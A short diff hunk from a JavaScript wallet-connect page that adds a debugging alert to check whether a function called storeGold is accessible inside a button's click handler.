@@ -572,6 +572,7 @@ document.getElementById('connect-to-wallet-btn')?.addEventListener('click', asyn
   
 document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', async function (event) {
 event.preventDefault();
+alert(typeof storeGold); // Should display 'function'. If not, storeGold isn't accessible.
 
 try {
 // Step 1: Handle private key input and derive wallet address
